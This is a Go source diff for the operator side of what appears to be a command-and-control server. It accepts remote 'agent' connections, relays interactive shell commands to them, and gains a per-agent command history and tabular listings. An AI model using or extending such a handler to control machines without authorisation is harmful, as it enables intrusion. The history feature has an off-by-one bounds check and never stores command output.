@@ -7,22 +7,32 @@ import (
 	"log"
 	"net"
 	"os"
+	"os/signal"
+	"strconv"
 	"strings"
+	"syscall"
+	"text/tabwriter"
 	"time"
 
 	"github.com/google/uuid"
 )
 
-type agent struct {
+type agentStruct struct {
 	name      string
 	address   string
 	startTime time.Time
 	Uuid      uuid.UUID
 	conn      net.Conn
+	commands  []commandStruct
+}
+
+type commandStruct struct {
+	input  string
+	output string
 }
 
 func RunServerCmd(host string, port string) {
-	agentList := map[uuid.UUID]*agent{}
+	agentList := map[uuid.UUID]*agentStruct{}
 
 	address := fmt.Sprintf("%s:%s", host, port)
 	fmt.Println("[+] Binding to ", address)
@@ -33,6 +43,13 @@ func RunServerCmd(host string, port string) {
 	}
 	defer listener.Close()
 
+	c := make(chan os.Signal)
+	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
+
+	go func() {
+		<-c
+	}()
+
 	go func(listener net.Listener) {
 		for {
 			agentConn, err := listener.Accept()
@@ -41,7 +58,7 @@ func RunServerCmd(host string, port string) {
 			}
 			agentUuid := uuid.New()
 			agentDate := time.Now()
-			agentList[agentUuid] = &agent{
+			agentList[agentUuid] = &agentStruct{
 				name:      "Undefined",
 				address:   agentConn.RemoteAddr().String(),
 				startTime: agentDate,
@@ -52,7 +69,7 @@ func RunServerCmd(host string, port string) {
 		}
 	}(listener)
 
-	var currentAgent *agent = nil
+	var currentAgent *agentStruct = nil
 
 	reader := bufio.NewReader(os.Stdin)
 
@@ -74,7 +91,7 @@ func RunServerCmd(host string, port string) {
 				displayHelp()
 				continue
 			case "shell":
-				runShell(currentAgent.conn)
+				runShell(currentAgent)
 				continue
 			case "back":
 				currentAgent = nil
@@ -92,11 +109,34 @@ func RunServerCmd(host string, port string) {
 				currentAgent.name = strings.Join(commands[1:], " ")
 				continue
 			case "info":
-				fmt.Print("\nUUID - Name - Connexion address - Start date\n")
-				fmt.Print("-------------------------------------------------------------\n")
-				fmt.Printf("%s - %s - %s - %s\n", currentAgent.Uuid.String(),
-					currentAgent.name, currentAgent.address,
-					currentAgent.startTime.Format("2-1-6 3:4:5"))
+				w := tabwriter.NewWriter(os.Stdout, 16, 2, 2, ' ', 0)
+				fmt.Fprintf(w, "UUID :\t%s\n", currentAgent.Uuid.String())
+				fmt.Fprintf(w, "Name :\t%s\n", currentAgent.name)
+				fmt.Fprintf(w, "Address :\t%s\n", currentAgent.address)
+				fmt.Fprintf(w, "Date :\t%s\n", currentAgent.startTime.Format("2006-01-02 03:04:05"))
+				w.Flush()
+				continue
+			case "history":
+				if len(commands) == 1 {
+					w := tabwriter.NewWriter(os.Stdout, 16, 2, 2, ' ', 0)
+					fmt.Fprint(w, "#\tCommand\n")
+					for i, elem := range currentAgent.commands {
+						fmt.Fprintf(w, "%d\t%s\n", i, elem.input)
+					}
+					w.Flush()
+				} else {
+					targetCmd, err := strconv.Atoi(commands[1])
+					if err != nil {
+						fmt.Print("\n[!] Please provide a valid number\n")
+						continue
+					}
+					if targetCmd > len(currentAgent.commands) || targetCmd < 0 {
+						fmt.Print("\n[!] Please provide a valid number\n")
+						continue
+					}
+					cmd := currentAgent.commands[targetCmd]
+					fmt.Printf("> %s\n%s\n", cmd.input, cmd.output)
+				}
 				continue
 			default:
 				continue
@@ -107,13 +147,14 @@ func RunServerCmd(host string, port string) {
 				displayHelp()
 			case "list":
 				fmt.Print("\nAgent list\n")
-				fmt.Print("\nUUID - Name - Connexion address - Start date\n")
-				fmt.Print("-------------------------------------------------------------\n")
+				w := tabwriter.NewWriter(os.Stdout, 16, 2, 2, ' ', 0)
+				fmt.Fprint(w, "UUID\tName\tAddress\tStart date\n")
 				for _, agent := range agentList {
-					fmt.Printf("%s - %s - %s - %s\n", agent.Uuid.String(),
+					fmt.Fprintf(w, "%s\t%s\t%s\t%s\n", agent.Uuid.String(),
 						agent.name, agent.address,
-						agent.startTime.Format("2006-01-02 03:04:05 PM"))
+						agent.startTime.Format("2006-01-02 03:04:05"))
 				}
+				w.Flush()
 				continue
 			case "use":
 				if len(commands) < 2 {
@@ -203,6 +244,8 @@ func displayHelp() {
 	fmt.Printf("\t- back\treturn to main menu from the agent\n")
 	fmt.Printf("\t- stop\tStop the agent and close the connection\n")
 	fmt.Printf("\t- name [name]\tChange name of the agent\n")
+	fmt.Printf("\t- history\tDisplay all the command executed into the agent\n")
+	fmt.Printf("\t- history [id]\tDisplay input and output of the command \"id\"\n")
 	fmt.Printf("\t- info\tGet information about the current agent\n")
 
 	fmt.Printf("\n[+] Help from an agent shell\n")
@@ -210,9 +253,9 @@ func displayHelp() {
 	fmt.Printf("\t- !back\treturn to the agent\n")
 }
 
-func runShell(conn net.Conn) {
+func runShell(currentAgent *agentStruct) {
 
-	go io.Copy(os.Stdout, conn)
+	go io.Copy(os.Stdout, currentAgent.conn)
 
 	for {
 		reader := bufio.NewReader(os.Stdin)
@@ -232,11 +275,21 @@ func runShell(conn net.Conn) {
 		case "!back":
 			return
 		default:
-			_, err := io.WriteString(conn, command)
+			if command == "" {
+				continue
+			}
+
+			_, err := io.WriteString(currentAgent.conn, command)
 			if err != nil {
 				fmt.Println(err)
 				return
 			}
+
+			currentAgent.commands = append(currentAgent.commands, commandStruct{
+				input:  command,
+				output: "",
+			})
+
 			// io.Copy(conn, command)
 			continue
 		}
